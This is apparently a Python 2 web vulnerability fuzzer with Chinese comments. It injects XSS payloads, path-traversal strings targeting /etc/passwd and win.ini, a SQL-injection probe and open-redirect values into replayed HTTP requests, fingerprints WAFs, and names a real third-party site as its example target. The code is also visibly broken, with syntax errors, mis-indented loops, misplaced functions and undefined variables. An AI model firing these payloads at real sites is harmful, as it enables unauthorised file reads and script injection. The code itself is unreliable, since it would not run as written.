#coding=utf-8
import urlparse
import urllib2
import urllib
import re
import base64
import socket
import ssl
import sys

class fuzzer:
    def __init__(self,request,detect_type,keyword="" , host, content_length, para_str):
        #self.url = url
        self.request = base64.b64decode(request)
        self.detect_type = detect_type
        self.keyword = keyword
        self.content_length = content_length
        self.host = host
        self.para_str = para_str

    def detect(self):
        global rhost,port

        if "443" in host":
            rhost = host.split(":")[0]
            port = 443
        else:
            rhost = host.split(":")[0]
            port = int(host.split(":")[1])


        #预检测是否存在WAF，如果存在，不进行下一步，直接警告。
        if self.waf_detect():
            return


        if self.detect_type == "file_read":
            log_value = self.file_read_detect()
        elif self.detect_type == "xss_detect":
            log_value = self.xss_detect()

        elif self.detect_type == "url_redirect":
            log_value = self.url_redirect_detect()

        elif self.detect_type == "file_download":
           log_value = self.file_download_detect()
           #http头好像多个stream字段吧,判断是否下载请求。
        elif self.detect_type == "pass_by": 
            log_value = self.pass_by_detect()
        else:
            return
        print log_value
        if log_value != False:
            print "[!]Success exploit here!\n"
        else:
            print "[+]Maybe no vulns here!\n"

    def socket_request(self):
        if port == 443:
            s = ssl.wrap_socket(socket.socket())
        else:
            s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
        s.connect((rhost, port))
        s.send(self.request)
        while True:
        buf = s.recv(1024)
        if not len(buf):
            break
        print buf
        return buf


def random_str(randomlength=4):
    str = ''
    chars = 'AaBbCcDdEeFfGgHhIiJjKkLlMmNnOoPpQqRrSsTtUuVvWwXxYyZz0123456789'
    length = len(chars) - 1
    random = Random()
    for i in range(randomlength):
        str+=chars[random.randint(0, length)]
        return str

    def waf_detect(self):
        print "[+]Start waf_detect...\n"
        try:
            if self.keyword != "":
                attack_para = self.para_str[0] + "' and 1=1"
            else:
                attack_para = self.keyword + "' and 1=1"
            attack_resp = self.socket_request(self.request)
        except Exception,e:
            print e
            return False


        if 'safedog' in attack_resp:
            print "[x]Maybe SafeDog waf here."
        elif '360safe' in attack_resp:
            print "[x]Maybe 360 waf here."
        elif '_D_SID' in attack_resp:
            print "[x]Maybe D waf here."
        elif 'X_Powered_By_360WZB' in attack_resp:
            print "[x]Maybe 360 Wangzhan waf here."
        elif 'jiasule' in  waf_resp:
            print "[x]Maybe Jiasule waf here."
        elif  'yunsuo' in waf_resp:
            print "[x]Maybe YunSuo waf here."
        #YunJiaSu is sb,wo zhe li mei zhao dao an li.
        elif 'X_Safe_Firewall' in attack_resp:
            print "[x]Unknown waf here."
        else:
            return False
        return True




    def log_print(self,vuln_type,para=""):
        resp_url = "[!]Vuln request:"+self.request+"\n"
        resp_type = "[!]Vuln type:"+vuln_type+"\n"
        resp_para = "[!]Vuln para:"+para+"\n"
        print resp_url+resp_type+resp_para
        f = open("log.txt","a+")
        f.writelines(resp_url+resp_type+resp_para)
        f.close()

    def fuzz_pre(self, fuzz_list , keyword_list, vuln_type):
        if self.keyword != "":
            for para in self.para_str:
                return_value = self.fuzz(para,fuzz_list,keyword_list)
                if return_value != False:
                    self.log_print(vuln_type ,para)
                    return True
        else:
            para = self.keyword
            return_value = self.fuzz(para, fuzz_list, keyword_list)
            if value != False:
                self.log_print(vuln_type ,para)
                return True

        
    def xss_detect(self, params):
        fuzz_list = [r"'><Svg/onload=prompt(628)><'",r"'><sCript defer>prompt(628)</SCript><'"]
        keyword_list = [r"prompt\(628"]
        print "[+]Start xss_detect...\n"
        self.fuzz_pre(fuzz_list , keyword_list, sys._getframe().f_code.co_name)
    
    def file_read_detect(self):
        fuzz_list = [r"../../../../../../../../../../../etc/passwd",r"%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/etc/passwd",r"../../../../../../../../../../windows/win.ini",r"c:\windows\win.ini","/etc/passwd"]
        keyword_list = [r"root:","[extensions]"]
        print "[+]Start file_read_detect...\n"
        self.fuzz_pre(fuzz_list , keyword_list, sys._getframe().f_code.co_name)


    def url_redirect_detect(self):
        fuzz_list = [r"@www.baidu.com",r"http://www.baidu.com"]
        keyword_list = [r"bd_logo1"]
        print "[+]Start url_redirect_detect...\n"
        self.fuzz_pre(fuzz_list , keyword_list, sys._getframe().f_code.co_name)
    
    #暂时放弃，没有特别好的判断方法，误报率可能会较高。
    #貌似有新的解决办法
    def file_download_detect(self):
        fuzz_list = [r"../../../../../../../../../../../etc/passwd",r"%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/etc/passwd",r"../../../../../../../../../../windows/win.ini",r"c:\windows\win.ini","/etc/passwd"]
        keyword_list = [r"Content-Type:application/octet-stream"]
        print "[+]Start file_download_detect...\n"
        self.fuzz_pre(fuzz_list , keyword_list, sys._getframe().f_code.co_name)

        
    #此处的关键词，也就是keyword，不能填参数，我们这里要填cookie值，可以复制Set-Cookie里面的内容。
    #坑爹的是，这里抓到的set-cookie好像内容很少，乌云和百度都没抓到，感觉有点鸡肋了。
    #这里只有复制第三方cookie，通过输入框传播。此处通过content-length大小来比较。
    def pass_by_detect(self):
        print "[+]Start pass_by_detect...\n"
        orignal_resp = self.socket_request(self.request)
        if 'Cookie:' in self.request:
            current_request = self.request.replace('Cookie: ','Cookie: '+self.random_str())
            current_resp = self.socket_request(current_request)
        else:
            return False
        if len(orignal_resp) != len(current_resp):
            self.log_print("pass_by_detect")
            return True
        else:
            return False
        
    def fuzz(self, para, fuzz_list, keyword_list):
        for item in fuzz_list:
            item_length = len(item)+int(self.content_length)
            vector_value =  para + str(item)

            try:
                attack_request = self.request.replace(para,vector_value)
                attack_request = attack_request.replace(self.content_length ,item_length)
                resp = self.socket_request(attack_request)

                for keyword in keyword_list:
                    match = re.search(keyword,''.join(resp))
                    if match:
                        print "[!]Match success!\n"
                        return True
                    else:
                        pass

            except Exception,e:
                print "[!]Match error:"+str(e)+"\n"
                return False
        return False


            
if __name__ == "__main__":
    exp_url = "http://www.tvsou.com/column/index.asp?id=yuQ17S"
    #keyword = "id"
    #fuzzer = fuzzer(url,keyword)
    #fuzzer = fuzzer(url)
    #fuzzer.detect()
            
                
            
        
        
    